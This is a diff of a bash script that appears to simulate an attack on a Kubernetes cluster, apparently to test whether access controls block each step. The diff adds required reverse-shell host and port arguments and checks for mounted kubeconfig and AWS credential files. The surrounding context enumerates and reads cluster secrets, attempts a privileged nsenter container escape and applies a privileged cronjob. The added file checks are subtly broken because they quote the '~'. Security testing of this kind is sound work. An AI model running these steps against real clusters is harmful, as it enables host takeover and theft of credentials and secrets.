@@ -41,10 +41,31 @@ for i in "$@"; do
   esac
 done
 
+if [ -z $REVERSE_SHELL_HOST ] || [ -z $REVERSE_SHELL_PORT ]; then
+  log "required args --reverse-shell-host or --reverse-shell-port missing"
+  exit 1
+fi
+
 cat <<EOF >> $LOGFILE
 REVERSE_SHELL_HOST=$REVERSE_SHELL_HOST
 REVERSE_SHELL_PORT=$REVERSE_SHELL_PORT
 EOF
+
+log "listing home directory..."
+ls -ltra ~/ 2>&1 | tee -a $LOGFILE
+
+log "checking mounted local kubeconfig..."
+if ! [ -f "~/.kube/config" ]; then
+  log "kubeconfig not found: ~/.kube/config"
+  exit 1
+fi
+
+log "checking mounted credentials..."
+ls -ltra ~/ 2>&1 | tee -a $LOGFILE
+if ! [ -f "~/.aws/config" ] || ! [ -f "~/.aws/credentials" ]; then
+  log "aws credentials not found: ~/.aws/config ~/.aws/credentials"
+  exit 1
+fi
 
 log "starting get enumeration..."
 entities=("pods" "namespaces" "cronjobs" "secrets" "configmaps" "deployments" "services" "roles" "clusterroles" "rolebindings" "clusterrolebindings")
@@ -58,7 +79,7 @@ done
 # denied exec
 log "starting denied exec..."
 RESULT=$(kubectl exec -it deployment/authapp -n authapp -- /bin/sh -c "echo helloworld") 
-echo $RESULT | tee -a $LOGFILE
+echo $RESULT 2>&1 | tee -a $LOGFILE
 
 # denied kubectl root
 log "starting denied run r00t..."
@@ -66,19 +87,19 @@ RESULT=$(kubectl run r00t -it --rm \
   --restart=Never \
   --image nah r00t \
   --overrides '{"spec":{"hostPID": true, "containers":[{"name":"x","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}' "$@")
-echo $RESULT | tee -a $LOGFILE
+echo $RESULT 2>&1 | tee -a $LOGFILE
 
 # denied access
 log "starting denied get secret..."
-kubectl get secret sh.helm.release.v1.reloader.v1 -n authapp -o json | tee -a $LOGFILE
+kubectl get secret sh.helm.release.v1.reloader.v1 -n authapp -o json 2>&1 | tee -a $LOGFILE
 
 # read only secret
 log "starting success get secret read-only..."
-kubectl get secret authapp-env-vars -n authapp -o json | tee -a $LOGFILE
+kubectl get secret authapp-env-vars -n authapp -o json 2>&1 | tee -a $LOGFILE
 
 # edit access
 log "starting success get secret read/write..."
-kubectl get secret s3app-env-vars -n s3app -o json | tee -a $LOGFILE
+kubectl get secret s3app-env-vars -n s3app -o json 2>&1 | tee -a $LOGFILE
 
 log "getting bucket value..."
 BUCKET_NAME=$(kubectl get secret s3app-env-vars -n s3app -o json | jq -r '.data.BUCKET_NAME')
@@ -128,7 +149,7 @@ spec:
             privileged: true
 EOF
 
-cat /tmp/kubernetes_prod_cronjob.yaml | tee -a $LOGFILE
+cat /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE
 
 log "starting cronjob..."
 kubectl apply -f /tmp/kubernetes_prod_cronjob.yaml
